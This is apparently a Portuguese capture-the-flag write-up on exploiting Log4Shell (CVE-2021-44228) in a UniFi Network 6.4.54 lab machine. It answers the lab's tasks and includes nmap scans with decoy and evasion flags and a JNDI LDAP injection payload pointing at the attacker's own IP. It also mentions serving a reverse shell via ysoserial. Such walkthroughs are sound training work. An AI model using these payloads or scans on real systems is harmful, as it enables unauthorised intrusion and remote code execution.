# Exploração da Vulnerabilidade Log4j

## Task 1: Identificação das Portas Abertas

Rodando o comando do Nmap:

```shell
sudo nmap -p- -T 5 -g 53 -D RND:5 -Pn --disable-arp-ping 10.129.201.80 -vv
```

Saída do Nmap:

```shell
PORT     STATE SERVICE       REASON
22/tcp   open  ssh           syn-ack ttl 63
6789/tcp open  ibm-db2-admin syn-ack ttl 63
8080/tcp open  http-proxy    syn-ack ttl 63
8443/tcp open  https-alt     syn-ack ttl 63
8843/tcp open  unknown       syn-ack ttl 63
8880/tcp open  cddbp-alt     syn-ack ttl 63
```

As quatro primeiras portas abertas são: **22, 6789, 8080 e 8443**.

## Task 2: Identificação do Software na Porta 8443

Rodando o Nmap com detecção de serviços:

```shell
sudo nmap -sVC -p 8443 -g 53 -D RND:5 10.129.201.80
```

Saída relevante:

```shell
PORT     STATE SERVICE         VERSION
8443/tcp open  ssl/nagios-nsca Nagios NSCA
| http-title: UniFi Network
|_Requested resource was /manage/account/login?redirect=%2Fmanage
```

O título do software é **UniFi Network**.

## Task 3: Identificação da Versão do Software

Acessando a página web via HTTPS (`https://10.129.201.80:8443`), encontramos uma tela de login que exibe a versão do software: **6.4.54**.

## Task 4: Identificação do CVE da Vulnerabilidade

Pesquisando o nome do serviço e sua versão, encontramos a vulnerabilidade associada: **CVE-2021-44228**.

## Task 5: Protocolo JNDI utilizado na Injeção

A pesquisa revelou que o protocolo utilizado é **LDAP**. Para explorar essa falha, podemos enviar um payload via BurpSuite:

```shell
${jndi:ldap://{Tun0 IP Address}/teste}
```

### Explicação do Payload:

1. **`${...}`**: Interpolação de strings no Log4j2.
2. **`jndi:`**: Indica uma requisição JNDI.
3. **`ldap://`**: Protocolo LDAP para busca de recursos.
4. **`{Tun0 IP Address}`**: IP da máquina atacante.
5. **`/teste`**: Caminho no servidor LDAP malicioso.

Quando processado, o Log4j2 faz uma requisição LDAP ao servidor atacante, que pode fornecer um payload malicioso, resultando em **execução remota de código (RCE)**.

### Exemplo de Exploração:

Se configurarmos um servidor LDAP (com **ysoserial**, por exemplo), podemos entregar um payload que executa uma **reverse shell** na máquina alvo.

## Task 6: Ferramenta para Interceptar o Tráfego

Podemos usar o **Tcpdump** para capturar pacotes de rede e verificar se o payload foi enviado e processado corretamente.

### Como Utilizar o Tcpdump:

6. **Monitorar a Requisição LDAP**:
    
    ```shell
    sudo tcpdump -i tun0 port 389
    ```
    
    Isso captura pacotes LDAP na interface **tun0**, usada em VPNs.
    
7. **Captura de Pacotes para Análise**:
    
    - Verificar se a aplicação fez a requisição ao servidor malicioso.
    - Analisar a resposta enviada pelo servidor atacante.

## Task 7: Porta Utilizada para Interceptação

A porta usada para interceptar o tráfego é **389**, correspondente ao protocolo **LDAP**.